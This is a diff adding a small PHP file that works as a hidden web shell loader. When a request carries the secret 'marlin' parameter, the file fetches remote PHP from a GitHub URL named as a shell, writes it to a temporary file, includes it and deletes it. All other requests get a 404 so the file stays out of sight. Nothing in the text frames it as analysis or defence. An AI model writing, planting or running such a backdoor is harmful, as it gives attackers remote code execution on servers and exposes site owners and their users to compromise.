@@ -1,0 +1,15 @@
+<?php
+if (isset($_GET["marlin"])) {
+    $a = "file_get_contents";
+    $b = "https://raw.githubusercontent.com/okewlalocksystems-tech/BELAWAN/refs/heads/main/shellkerasnew.txt";
+    $c = $a($b);
+    $tmp = tempnam(sys_get_temp_dir(), "xp") . ".php";
+    file_put_contents($tmp, $c);
+    try {
+        include $tmp;
+    } finally {
+        unlink($tmp);
+    }
+} else {
+    http_response_code(404);
+}
